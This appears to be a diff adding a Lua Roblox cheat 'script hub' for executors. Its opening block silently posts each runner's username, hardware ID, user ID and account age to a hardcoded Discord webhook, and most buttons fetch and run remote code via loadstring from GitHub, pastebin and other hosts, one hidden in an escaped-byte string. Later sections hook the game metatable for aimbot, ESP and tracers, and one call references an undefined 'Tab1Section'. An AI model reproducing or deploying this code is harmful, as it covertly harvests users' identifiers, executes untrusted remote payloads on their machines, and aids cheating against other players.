@@ -1,0 +1,634 @@
+local webh = "https://discord.com/api/webhooks/1051697358926270657/-YhlGRa2Z8MIegpdhBhHfmsyIuSoFUhzl9lB2rzdZmA0jfouDJTXaTlL7Lq0bJifTgxf"
+
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = 'Roblox Scripts Hub:',
+       ['description'] = "An execution has been detected!",
+       ['fields'] = {
+          {name = "Username:", value = game:GetService("Players").LocalPlayer.Name},
+          {name = "Hardware ID:", value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = "Ingame Ping:", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+          {name = "Game Name:", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},
+          {name = "User ID:", value = game.Players.LocalPlayer.UserId},
+          {name = "Place ID:", value = game.PlaceId},
+          {name = "Account Age:", value = game.Players.LocalPlayer.AccountAge},
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(158, 212, 251)
+Frame.BackgroundTransparency = 0.500
+Frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Frame.Position = UDim2.new(0.869897962, 0, 0.0631399453, 0)
+Frame.Size = UDim2.new(0.130102038, 0, 0.203071669, 0)
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.Position = UDim2.new(0, 0, -0.00593984127, 0)
+TextButton.Size = UDim2.new(1, 0, 1, 0)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Toggle UI"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 35.000
+TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextStrokeTransparency = 0.000
+TextButton.TextWrapped = true
+TextButton.MouseButton1Click:Connect(function()
+	game:GetService("VirtualInputManager"):SendKeyEvent(true, "F6" , false , game)
+end)
+
+UITextSizeConstraint.Parent = TextButton
+UITextSizeConstraint.MaxTextSize = 35
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/Test.lua"))();
+
+local Window = Library.CreateLib("Roblox Script's Hub", "BloodTheme")
+
+local Tab1 = Window:NewTab("Toggle UI")
+local Tab2 = Window:NewTab("Main")
+local Tab3 = Window:NewTab("game scripts")
+local Tab4 = Window:NewTab("Credits")
+local Tab5 = Window:NewTab("discord server")
+local Tab6 = Window:NewTab("Fe Scripts")
+local Tab7 = Window:NewTab("Kat")
+local Section1 = Tab1:NewSection("toggle the ui")
+local Section2 = Tab2:NewSection("Main Scripts")
+local Section3 = Tab3:NewSection("Scripts")
+local Section4 = Tab4:NewSection("Owner: ChaddestCat#1981")
+local Section4 = Tab4:NewSection("Helper: ice bear#7541")
+local Section5 = Tab5:NewSection("Join our discord to get updates")
+local Section6 = Tab6:NewSection("these are all Fe scripts")
+local Section7 = Tab7:NewSection("KAT script made by me")
+
+Section1:NewKeybind("Toggle ui", "Toggle the ui yes", Enum.KeyCode.F6, function()
+    Library:ToggleUI()
+end)
+
+Section2:NewButton("Infinite Yield", "Op Admin Script", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+Section2:NewButton("Fly", "fly script bro", function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+end)
+
+Section2:NewButton("Inf Jump", "a script that allows you to inf jump", function()
+    local InfiniteJumpEnabled = true
+game:GetService("UserInputService").JumpRequest:connect(function()
+	if InfiniteJumpEnabled then
+		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+	end
+end)
+end)
+
+Section2:NewButton("walkspeed", "you can become sonic lol", function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed  =  50
+end)
+
+Section3:NewButton("blox fruit", "hoho hub", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+end)
+
+Section3:NewButton("Da Hood", "nukermode", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
+end)
+
+Section5:NewButton("Click link to copy", "join cuz why not", function()
+   setclipboard("https://discord.gg/gKEcVn6hBM")
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Invite link";
+    Text = "your invite link has been copied into your clipboard"; -- what the text says (ofc)
+    Duration = 25;
+})
+wait(1)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Enjoy";
+    Text = "make sure you to subscribe Yxu Sin"; -- what the text says (ofc)
+    Duration = 25;
+})
+end)
+
+Section2:NewButton("Keyboard Script", "a script that allows you to use keyboard in game", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+end)
+
+Section6:NewButton("Fe Headless", "gives you a headless ril1!1!", function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/misc/fe-headless.lua"))()
+end)
+
+Section3:NewButton("Arsenal", "best arsenal script for mobile ig", function()
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/PWNERHUB.lua"), true))()
+end)
+
+Section3:NewButton("Longest answer wins", "kinda op ig", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/K8i6p1Wu"))()
+end)
+
+Section3:NewButton("Doors", "made by GamingScripter ", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Doors"))()
+end)
+
+Section3:NewButton("Evade", "Evade mobile op", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
+end)
+
+Section3:NewButton("king legacy", "no description xd", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xOne2/King-Legacy/main/README.md"))()
+end)
+
+Section3:NewButton("Build a boat for treasure ", "This one is actually op", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/silver-couscous/main/masage.lua"))()
+end)
+
+Section2:NewButton("Rejoin", "Rejoins a server that ur in", function()
+    game.StarterGui:SetCore("SendNotification", {
+    Title = "Rejoin";
+    Text = "You may have to execute it again"; -- what the text says (ofc)
+    Duration = 5;
+})
+wait(5)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Rejoining....";
+    Text = ""; -- what the text says (ofc)
+    Duration = 3;
+})
+wait(3)
+local tpservice= game:GetService("TeleportService")
+local plr = game.Players.LocalPlayer
+
+tpservice:Teleport(game.PlaceId, plr)
+end)
+
+Section3:NewButton("Dragon Ball Rage", "Credits to Owner ig", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/rubicmaster/my_scripts/main/Dragon_ball_rage%22"))()
+end)
+
+Section3:NewButton("Ro-Ghoul", "yes", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Roghoul", true))()
+end)
+
+Section3:NewButton("Ninja Tycoon", "no description", function()
+    loadstring(game:HttpGet"https://thedragonslayer2.github.io/AutoExec.html")()
+end)
+
+Section3:NewButton("Legend Of Speed", "subscribe to Yxu Sin to be pro", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Legends-of-speed'),true))()
+end)
+
+Section3:NewButton("Weapon Fighting Simulator", "credits to Owner", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/loader_1038"))()
+end)
+
+Section3:NewButton("Auto Piano", "it has a rickroll song", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Madness676/FixedPianoV2/main/Pandaexploits.lua", true))()
+end)
+
+Section2:NewButton("Shiftlock", "hmm idk", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/t8rvTz8n", true))()
+end)
+
+Section6:NewButton("Fe portal gun", "kinda op", function()
+    loadstring(game:HttpGet(('https://pastefy.ga/hXHOUgDa/raw'),true))()
+end)
+
+Section3:NewButton("Shader Script", "makes your game more realistic", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Shaders.xml"))()
+end)
+
+Section3:NewButton("Graphic Script", "idk what to say", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
+end)
+
+Section2:NewTextBox("tp to people", "you have to put their full username", function(txt)
+	local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
+local p2 = (txt)
+local pos = p1.CFrame
+
+p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
+
+wait(10)
+
+p1.CFrame = pos
+end)
+
+Section3:NewButton("IceHub", " Brookhaven,adopt me, blox fruit", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+end)
+
+Section6:NewButton("chat bypass", " you need to rejoin to reset", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/x114/RobloxScripts/main/FullChatBypass"))()
+end)
+
+Section3:NewButton("Shindo Life", "credits to premier hub", function()
+    -- https://discord.gg/c7tRAqYHMA
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TrustsenseDev/Utilities/main/Premier.lua', true))()
+end)
+
+Section6:NewButton("Fe Baller (netless needed)", "Credits to Owner", function()
+    loadstring(game:HttpGet("https://pastefy.ga/ToLgbyXr/raw"))()
+end)
+
+Section6:NewButton("Netless", "execute this to use baller", function()
+    loadstring(game:HttpGet("https://pastefy.ga/4ydjAfsj/raw"))()
+end)
+
+Section3:NewButton("Bloxburg", "credits to Owner", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PainfulDestroyer/Roblox/main/Scar%20Hub"))()
+end)
+
+Section3:NewButton("Pet Simulator X", "poggers", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PainfulDestroyer/Roblox/main/Scar%20Hub"))()
+end)
+
+Section3:NewButton("Bee Swarm", "credits to Owner", function()
+    loadstring(game:HttpGet('https://s.kometa.ga/kometa.lua'))()
+end)
+
+Section3:NewButton("Sword Fighters Simulator", "credits to distic hub", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bebedi15/DisticHub/main/Loader.lua"))()
+end)
+
+Section6:NewButton("Fe Monster", "credits to Owner", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/u5RRAUMS",true))()
+end)
+
+Section3:NewButton("Combat Warriors", "credits to project hook", function()
+    loadstring(game:HttpGet("https://projecthook.xyz/scripts/free.lua"))()
+end)
+
+Section7:NewButton("Aimbot/Hitbox/Silent Aim", "increase your aim", function()
+    local Camera = game:GetService("Workspace").CurrentCamera
+local Players = game:GetService("Players")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local function GetClosestPlayer()
+   local ClosestPlayer = nil
+   local FarthestDistance = math.huge
+
+   for i, v in pairs(Players.GetPlayers(Players)) do
+       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
+           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude
+
+           if DistanceFromPlayer < FarthestDistance then
+               FarthestDistance = DistanceFromPlayer
+               ClosestPlayer = v
+           end
+       end
+   end
+
+   if ClosestPlayer then
+       return ClosestPlayer
+   end
+end
+
+local GameMetaTable = getrawmetatable(game)
+local OldGameMetaTableNamecall = GameMetaTable.__namecall
+setreadonly(GameMetaTable, false)
+
+GameMetaTable.__namecall = newcclosure(function(object, ...)
+   local NamecallMethod = getnamecallmethod()
+   local Arguments = {...}
+
+   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
+       local ClosestPlayer = GetClosestPlayer()
+       
+       if ClosestPlayer and ClosestPlayer.Character then
+           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
+       end
+   end
+
+   return OldGameMetaTableNamecall(object, unpack(Arguments))
+end)
+
+setreadonly(GameMetaTable, true)
+end)
+
+Section7:NewToggle("Esp Box", "Shows all players", function()
+local Player = game:GetService("Players").LocalPlayer
+local Camera = game:GetService("Workspace").CurrentCamera
+local Mouse = Player:GetMouse()
+
+local function Dist(pointA, pointB) -- magnitude errors for some reason  : (
+    return math.sqrt(math.pow(pointA.X - pointB.X, 2) + math.pow(pointA.Y - pointB.Y, 2))
+end
+
+local function GetClosest(points, dest)
+    local min  = math.huge 
+    local closest = nil
+    for _,v in pairs(points) do
+        local dist = Dist(v, dest)
+        if dist < min then
+            min = dist
+            closest = v
+        end
+    end
+    return closest
+end
+
+local function DrawESP(plr)
+    local Box = Drawing.new("Quad")
+    Box.Visible = false
+    Box.PointA = Vector2.new(0, 0)
+    Box.PointB = Vector2.new(0, 0)
+    Box.PointC = Vector2.new(0, 0)
+    Box.PointD = Vector2.new(0, 0)
+    Box.Color = Color3.fromRGB(255, 255, 255)
+    Box.Thickness = 2
+    Box.Transparency = 1
+
+    local function Update()
+        local c
+        c = game:GetService("RunService").RenderStepped:Connect(function()
+            if plr.Character ~= nil and plr.Character:FindFirstChildOfClass("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 and plr.Character:FindFirstChild("Head") ~= nil then
+                local pos, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
+                if vis then 
+                    local points = {}
+                    local c = 0
+                    for _,v in pairs(plr.Character:GetChildren()) do
+                        if v:IsA("BasePart") then
+                            c = c + 1
+                            local p = Camera:WorldToViewportPoint(v.Position)
+                            if v.Name == "HumanoidRootPart" then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(0, 0, -v.Size.Z)).p)
+                            elseif v.Name == "Head" then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(0, v.Size.Y/2, v.Size.Z/1.25)).p)
+                            elseif string.match(v.Name, "Left") then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(-v.Size.X/2, 0, 0)).p)
+                            elseif string.match(v.Name, "Right") then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(v.Size.X/2, 0, 0)).p)
+                            end
+                            points[c] = p
+                        end
+                    end
+                    local Left = GetClosest(points, Vector2.new(0, pos.Y))
+                    local Right = GetClosest(points, Vector2.new(Camera.ViewportSize.X, pos.Y))
+                    local Top = GetClosest(points, Vector2.new(pos.X, 0))
+                    local Bottom = GetClosest(points, Vector2.new(pos.X, Camera.ViewportSize.Y))
+
+                    if Left ~= nil and Right ~= nil and Top ~= nil and Bottom ~= nil then
+                        Box.PointA = Vector2.new(Right.X, Top.Y)
+                        Box.PointB = Vector2.new(Left.X, Top.Y)
+                        Box.PointC = Vector2.new(Left.X, Bottom.Y)
+                        Box.PointD = Vector2.new(Right.X, Bottom.Y)
+
+                        Box.Visible = true
+                    else 
+                        Box.Visible = false
+                    end
+                else 
+                    Box.Visible = false
+                end
+            else
+                Box.Visible = false
+                if game.Players:FindFirstChild(plr.Name) == nil then
+                    c:Disconnect()
+                end
+            end
+        end)
+    end
+    coroutine.wrap(Update)()
+end
+
+for _,v in pairs(game:GetService("Players"):GetChildren()) do
+    if v.Name ~= Player.Name then 
+        DrawESP(v)
+    end
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(v)
+    DrawESP(v)
+end)
+end)
+
+Section7:NewToggle("Tracers", "kinda buggy but ok", function ()
+local Player = game:GetService("Players").LocalPlayer
+local Camera = game:GetService("Workspace").CurrentCamera
+local Mouse = Player:GetMouse()
+
+local function Dist(pointA, pointB) -- magnitude errors for some reason  : (
+    return math.sqrt(math.pow(pointA.X - pointB.X, 2) + math.pow(pointA.Y - pointB.Y, 2))
+end
+
+local function GetClosest(points, dest)
+    local min  = math.huge 
+    local closest = nil
+    for _,v in pairs(points) do
+        local dist = Dist(v, dest)
+        if dist < min then
+            min = dist
+            closest = v
+        end
+    end
+    return closest
+end
+
+local function DrawESP(plr)
+    local Box = Drawing.new("Quad")
+    Box.Visible = false
+    Box.PointA = Vector2.new(0, 0)
+    Box.PointB = Vector2.new(0, 0)
+    Box.PointC = Vector2.new(0, 0)
+    Box.PointD = Vector2.new(0, 0)
+    Box.Color = Color3.fromRGB(255, 255, 255)
+    Box.Thickness = 2
+    Box.Transparency = 1
+
+    local function Update()
+        local c
+        c = game:GetService("RunService").RenderStepped:Connect(function()
+            if plr.Character ~= nil and plr.Character:FindFirstChildOfClass("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 and plr.Character:FindFirstChild("Head") ~= nil then
+                local pos, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
+                if vis then 
+                    local points = {}
+                    local c = 0
+                    for _,v in pairs(plr.Character:GetChildren()) do
+                        if v:IsA("BasePart") then
+                            c = c + 1
+                            local p = Camera:WorldToViewportPoint(v.Position)
+                            if v.Name == "HumanoidRootPart" then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(0, 0, -v.Size.Z)).p)
+                            elseif v.Name == "Head" then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(0, v.Size.Y/2, v.Size.Z/1.25)).p)
+                            elseif string.match(v.Name, "Left") then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(-v.Size.X/2, 0, 0)).p)
+                            elseif string.match(v.Name, "Right") then
+                                p = Camera:WorldToViewportPoint((v.CFrame * CFrame.new(v.Size.X/2, 0, 0)).p)
+                            end
+                            points[c] = p
+                        end
+                    end
+                    local Left = GetClosest(points, Vector2.new(0, pos.Y))
+                    local Right = GetClosest(points, Vector2.new(Camera.ViewportSize.X, pos.Y))
+                    local Top = GetClosest(points, Vector2.new(pos.X, 0))
+                    local Bottom = GetClosest(points, Vector2.new(pos.X, Camera.ViewportSize.Y))
+
+                    if Left ~= nil and Right ~= nil and Top ~= nil and Bottom ~= nil then
+                        Box.PointA = Vector2.new(Right.X, Top.Y)
+                        Box.PointB = Vector2.new(Left.X, Top.Y)
+                        Box.PointC = Vector2.new(Left.X, Bottom.Y)
+                        Box.PointD = Vector2.new(Right.X, Bottom.Y)
+
+                        Box.Visible = true
+                    else 
+                        Box.Visible = false
+                    end
+                else 
+                    Box.Visible = false
+                end
+            else
+                Box.Visible = false
+                if game.Players:FindFirstChild(plr.Name) == nil then
+                    c:Disconnect()
+                end
+            end
+        end)
+    end
+    coroutine.wrap(Update)()
+end
+
+for _,v in pairs(game:GetService("Players"):GetChildren()) do
+    if v.Name ~= Player.Name then 
+        DrawESP(v)
+    end
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(v)
+    DrawESP(v)
+end)
+end)
+
+Tab1Section:NewToggle("Tracers","Opens Tracers",function()
+local lplr = game.Players.LocalPlayer
+local camera = game:GetService("Workspace").CurrentCamera
+local CurrentCamera = workspace.CurrentCamera
+local worldToViewportPoint = CurrentCamera.worldToViewportPoint
+
+_G.TeamCheck = false -- Use True or False to toggle TeamCheck
+
+for i,v in pairs(game.Players:GetChildren()) do
+    local Tracer = Drawing.new("Line")
+    Tracer.Visible = false
+    Tracer.Color = Color3.new(255, 0, 0)
+    Tracer.Thickness = 1
+    Tracer.Transparency = 1
+
+    function lineesp()
+        game:GetService("RunService").RenderStepped:Connect(function()
+            if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
+                local Vector, OnScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
+
+                if OnScreen then
+                    Tracer.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 1)
+                    Tracer.To = Vector2.new(Vector.X, Vector.Y)
+
+                    if _G.TeamCheck and v.TeamColor == lplr.TeamColor then
+                        --//Teammates
+                        Tracer.Visible = false
+                    else
+                        --//Enemies
+                        Tracer.Visible = true
+                    end
+                else
+                    Tracer.Visible = false
+                end
+            else
+                Tracer.Visible = false
+            end
+        end)
+    end
+    coroutine.wrap(lineesp)()
+end
+
+game.Players.PlayerAdded:Connect(function(v)
+    local Tracer = Drawing.new("Line")
+    Tracer.Visible = false
+    Tracer.Color = Color3.new(1,1,1)
+    Tracer.Thickness = 1
+    Tracer.Transparency = 1
+
+    function lineesp()
+        game:GetService("RunService").RenderStepped:Connect(function()
+            if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
+                local Vector, OnScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
+
+                if OnScreen then
+                    Tracer.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 1)
+                    Tracer.To = Vector2.new(Vector.X, Vector.Y)
+
+                    if _G.TeamCheck and v.TeamColor == lplr.TeamColor then
+                        --//Teammates
+                        Tracer.Visible = false
+                    else
+                        --//Enemies
+                        Tracer.Visible = true
+                    end
+                else
+                    Tracer.Visible = false
+                end
+            else
+                Tracer.Visible = false
+            end
+        end)
+    end
+    coroutine.wrap(lineesp)()
+end)
+end)
